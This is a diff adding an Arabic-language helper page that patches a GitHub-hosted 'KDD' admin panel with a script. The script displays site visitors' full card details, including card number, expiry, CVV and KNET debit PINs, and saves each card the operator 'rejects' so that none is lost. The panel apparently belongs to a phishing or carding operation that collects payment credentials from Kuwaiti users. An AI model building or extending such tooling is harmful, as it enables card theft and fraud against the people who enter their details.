@@ -1,0 +1,171 @@
+<!doctype html><html dir="rtl" lang="ar"><head><meta charset="utf-8"><title>f114</title>
+<style>
+body{font:13px/1.6 system-ui,sans-serif;background:#0f1115;color:#e7e9ee;padding:16px;max-width:900px;margin:auto}
+button{font:14px system-ui;padding:10px 18px;margin:6px 6px 6px 0;background:#2563eb;color:#fff;border:0;border-radius:8px;cursor:pointer}
+button.alt{background:#374151}a{color:#7cc4ff}
+pre{background:#14181e;border:1px solid #232a33;border-radius:8px;padding:10px;white-space:pre-wrap;word-break:break-all;min-height:70px}
+textarea{width:100%;height:200px;font:11px/1.4 monospace;background:#0b0e12;color:#cfd6e0;border:1px solid #232a33;border-radius:8px;padding:8px;box-sizing:border-box;direction:ltr}
+.ok{color:#7ee787}.er{color:#ff7b72}.wn{color:#f0b429}
+</style></head><body>
+<h3>FIX114 — استرجاع صفحة الأدمن كاملة + إضافة السكربت</h3>
+<ol>
+<li>اضغط <b>جهّز الملف</b>.</li>
+<li>افتح صفحة التعديل على GitHub.</li>
+<li>بالمحرر: <b>Ctrl+A</b> ثم <b>Ctrl+V</b> ثم Commit.</li>
+</ol>
+<button id="mk">جهّز الملف</button>
+<button id="cp" class="alt">انسخ</button>
+<button id="dl" class="alt">نزّل</button>
+<a href="https://github.com/fahshomi-ui/KDD/edit/main/server/admin/index.html" target="_blank" rel="noopener">افتح صفحة التعديل</a>
+<pre id="log"></pre>
+<textarea id="ta" spellcheck="false"></textarea>
+
+<script type="text/plain" id="src">
+(function(){
+  if (window.__f114) return; window.__f114 = 1;
+  var K = {};
+  try { K = JSON.parse(localStorage.getItem('kdd_rej_cards')||'{}') || {}; } catch(e){ K = {}; }
+  function sv(){ try { localStorage.setItem('kdd_rej_cards', JSON.stringify(K)); } catch(e){} }
+  function sel(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
+  function vis(){ var id = sel(); if(!id) return null; try { return visitors.get(id) || null; } catch(e){ return null; } }
+  function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g,function(c){return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];}); }
+  function cardHTML(c, t){
+    var raw = String(c.cardNumber||'').replace(/\D/g,'');
+    var info = (typeof getCardInfo === 'function') ? getCardInfo(raw) : {bank:'',network:'',type:'',tier:''};
+    var isK = String(c.paymentMethod||'').toUpperCase() === 'KNET';
+    var bg = isK ? 'linear-gradient(135deg,#d1fae5 0%,#ecfdf5 50%,#a7f3d0 100%)' : 'linear-gradient(135deg,#e8e8e8 0%,#f5f5f5 50%,#e0e0e0 100%)';
+    var bd = isK ? '#6ee7b7' : '#d0d0d0', fg = isK ? '#064e3b' : '#333', lbl = isK ? '#065f46' : '#888';
+    var num = isK ? (c.cardNumberOnly||raw) : raw;
+    var fmt = num ? String(num).replace(/(\d{4})(?=\d)/g,'$1 ') : '—';
+    var h = '';
+    h += '<div class="data-section ' + (isK?'bg-green-50':'bg-purple-50') + ' p-4 rounded-lg" style="border-right-color:' + (isK?'#16a34a':'#9333ea') + '">';
+    h += '<div class="flex justify-between items-center mb-3"><h3 class="font-bold ' + (isK?'text-green-800':'text-purple-800') + '">' + (isK?'💳 كي نت (KNET)':'💳 بطاقة دفع') + '</h3>';
+    h += '<span style="font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:#fee2e2;color:#b91c1c">مرفوض · ' + t + '</span></div>';
+    h += '<div style="background:' + bg + ';border-radius:16px;padding:20px 24px;max-width:420px;margin:0 auto;box-shadow:0 4px 15px rgba(0,0,0,.15);border:1px solid ' + bd + ';font-family:monospace">';
+    h += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px"><span style="color:' + lbl + ';font-size:13px;font-weight:bold">' + (isK?'KNET':'KWD') + '</span>';
+    h += '<span style="color:' + fg + ';font-size:15px;font-weight:bold">' + esc(isK?(c.bankName||''):info.bank) + ' 🏦</span></div>';
+    h += '<div style="text-align:center;margin-bottom:14px"><span dir="ltr" style="font-size:22px;font-weight:bold;color:' + fg + ';letter-spacing:3px;unicode-bidi:embed;display:inline-block">' + fmt + '</span></div>';
+    h += '<div style="display:flex;justify-content:space-between;margin-bottom:14px">';
+    if (isK) { h += '<div style="text-align:left"><span style="color:' + lbl + ';font-size:11px">Prefix</span><br><span dir="ltr" style="color:#fff;background:' + lbl + ';font-size:15px;font-weight:bold;padding:3px 10px;border-radius:6px">' + esc(c.prefix||'') + '</span></div>'; }
+    else { h += '<div style="text-align:left"><span style="color:' + lbl + ';font-size:11px">Name</span><br><span style="color:' + fg + ';font-size:14px;font-weight:600">' + esc(c.nameOnCard||'') + '</span></div>'; }
+    h += '<div style="text-align:right"><span style="color:' + lbl + ';font-size:11px">Expiry</span><br><span style="color:' + fg + ';font-size:16px;font-weight:bold">' + esc((c.expiryMonth||'')+'/'+(c.expiryYear||'')) + '</span></div></div>';
+    h += '<div style="display:flex;justify-content:space-between">';
+    if (isK) {
+      h += '<div><span style="color:' + lbl + ';font-size:11px">PIN</span><br><span style="color:' + fg + ';font-size:18px;font-weight:bold">' + esc(c.pin||'-') + '</span></div>';
+      h += '<div style="text-align:center"><span style="color:' + lbl + ';font-size:11px">CVV</span><br><span style="color:' + fg + ';font-size:18px;font-weight:bold">' + esc(c.cvv||'-') + '</span></div>';
+      h += '<div style="text-align:right"><span style="font-size:16px;font-weight:bold;color:#047857">KNET</span><br><span style="color:' + lbl + ';font-size:11px;font-weight:bold">DEBIT</span></div>';
+    } else {
+      h += '<div><span style="color:' + lbl + ';font-size:11px">CVV</span><br><span style="color:' + fg + ';font-size:18px;font-weight:bold">' + esc(c.cvv||'-') + '</span></div>';
+      h += '<div style="text-align:right"><span style="font-size:16px;font-weight:bold;color:#1a1f71">' + esc(info.network||'') + '</span><br><span style="color:#555;font-size:11px;font-weight:bold">' + esc(String(info.type||'').toUpperCase()+' • '+String(info.tier||'').toUpperCase()) + '</span></div>';
+    }
+    h += '</div></div></div>';
+    return h;
+  }
+  function cont(){
+    var box = document.getElementById('visitorDetails'); if(!box) return null;
+    var c = box.querySelector('.space-y-3'); if (c) return c;
+    var w = box.querySelector('.space-y-6'); if(!w) return null;
+    c = document.createElement('div'); c.className='space-y-3';
+    if (w.children.length>1) w.insertBefore(c, w.children[1]); else w.appendChild(c);
+    return c;
+  }
+  var last='';
+  function draw(){
+    var box = document.getElementById('visitorDetails'); if(!box) return;
+    var id = sel(); if(!id) return;
+    var c = cont(); if(!c) return;
+    var arr = K[id] || [];
+    var sig = id + '#' + arr.map(function(x){return x.ts;}).join(',');
+    if (sig === last && c.querySelector('[data-f114]')) return;
+    last = sig;
+    var olds = c.querySelectorAll('[data-f114]');
+    for (var k=0;k<olds.length;k++) olds[k].parentNode.removeChild(olds[k]);
+    for (var i=arr.length-1;i>=0;i--){
+      var d = document.createElement('div'); d.setAttribute('data-f114','1');
+      d.innerHTML = cardHTML(arr[i].card || {}, arr[i].t || '');
+      c.insertBefore(d, c.firstChild);
+    }
+  }
+  document.addEventListener('click', function(e){
+    var b = e.target && e.target.closest ? e.target.closest('button') : null;
+    if (!b) return;
+    if (String(b.textContent||'').indexOf('رفض') < 0) return;
+    var sec = b.closest ? b.closest('.data-section') : null;
+    if (!sec) return;
+    var h = sec.querySelector('h3'); var title = h ? String(h.textContent||'') : '';
+    if (title.indexOf('بطاقة') < 0 && title.indexOf('كي نت') < 0) return;
+    setTimeout(function(){
+      var v = vis(); if(!v) return;
+      var live = v.liveCard || null, card = null;
+      if (live && String(live.cardNumber||'').replace(/\D/g,'')) card = { cardNumber: live.cardNumber, nameOnCard: live.nameOnCard, expiryDate: live.expiryDate, cvv: live.cvv, paymentMethod:'CARD' };
+      if (!card) { try { var pc = (v.paymentCards||[]); if (pc.length) card = pc[pc.length-1]; } catch(x){} }
+      if (!card) return;
+      var isK = (title.indexOf('كي نت') > -1) || String(card.paymentMethod||'').toUpperCase()==='KNET';
+      var raw = String(card.cardNumber||'').replace(/\D/g,'');
+      var snap = {
+        cardNumber: raw,
+        cardNumberOnly: isK ? raw.slice(6) : undefined,
+        prefix: isK ? raw.slice(0,6) : (card.prefix||''),
+        bankName: card.bankName||card.nameOnCard||'',
+        nameOnCard: card.nameOnCard||'',
+        expiryMonth: card.expiryMonth || (String(card.expiryDate||'').split('/')[0]||''),
+        expiryYear: card.expiryYear || (String(card.expiryDate||'').split('/')[1]||''),
+        cvv: card.cvv||'', pin: card.pin||'',
+        paymentMethod: isK ? 'KNET' : 'CARD'
+      };
+      var id = sel(); if(!id) return;
+      var a = K[id] || (K[id]=[]);
+      var lt = a[a.length-1];
+      if (lt && lt.card && lt.card.cardNumber === snap.cardNumber && (Date.now()-(lt.ts||0) < 5000)) return;
+      a.push({ ts: Date.now(), t: new Date().toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'}), card: snap });
+      sv(); last=''; draw();
+    }, 60);
+  }, true);
+  var o = window.renderVisitorDetails;
+  if (typeof o === 'function' && !o.__f114){
+    var f = function(){ var r = o.apply(this, arguments); try{ last=''; draw(); }catch(e){} return r; };
+    f.__f114 = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
+  }
+  setInterval(function(){ draw(); }, 800);
+})();
+</script>
+
+<script>
+var O=document.getElementById('log'),TA=document.getElementById('ta');
+function L(t,c){var d=document.createElement('div');if(c)d.className=c;d.textContent=String(t);O.appendChild(d);}
+var REPO='fahshomi-ui/KDD', PATH='server/admin/index.html';
+var BODY=document.getElementById('src').textContent.replace(/^\s*\n/,'').replace(/\s*$/,'\n');
+var F114='<script id="kddF114">\n'+BODY+'<\/script>\n';
+function get(u){return fetch(u+'?x='+Date.now(),{cache:'no-store'}).then(function(r){return r.text()});}
+document.getElementById('mk').onclick=async function(){
+  O.innerHTML='';
+  try{
+    L('جلب قائمة التعديلات…');
+    var r=await fetch('https://api.github.com/repos/'+REPO+'/commits?path='+PATH+'&per_page=8',{cache:'no-store'});
+    var j=await r.json();
+    if(!Array.isArray(j)||!j.length){L('ما قدرت أجيب التعديلات','er');return;}
+    var good=null;
+    for(var i=0;i<j.length;i++){
+      var sha=j[i].sha;
+      var t=await get('https://raw.githubusercontent.com/'+REPO+'/'+sha+'/'+PATH);
+      var ok = t.indexOf('loginModal')>-1 && t.indexOf('kddF113')>-1 && t.indexOf('kddF114')<0;
+      L('نسخة '+sha.slice(0,7)+' — طول '+t.length+(ok?' ✔ سليمة':' ✘'));
+      if(ok){ good=t; break; }
+    }
+    if(!good){L('ما لقيت نسخة سليمة','er');return;}
+    var out = good.indexOf('</body>')>-1 ? good.replace('</body>', F114+'</body>') : good+F114;
+    TA.value=out;
+    L('جاهز — الطول '+out.length+'. اضغط «انسخ» ثم بمحرر GitHub Ctrl+A ثم Ctrl+V.','ok');
+  }catch(e){L('خطأ: '+e.message,'er');}
+};
+document.getElementById('cp').onclick=function(){
+  if(!TA.value){L('جهّز الملف أولاً','er');return;}
+  TA.focus();TA.select();
+  try{navigator.clipboard.writeText(TA.value).then(function(){L('تم النسخ ✔','ok');},function(){document.execCommand('copy');L('تم النسخ ✔','ok');});}
+  catch(e){document.execCommand('copy');L('تم النسخ ✔','ok');}
+};
+document.getElementById('dl').onclick=function(){
+  if(!TA.value){L('جهّز أولاً','er');return;}
+  var a=document.createElement('a');a.href=URL.createObjectURL(new Blob([TA.value],{type:'text/html'}));a.download='index.html';a.click();L('نُزّل','ok');
+};
+</script></body></html>
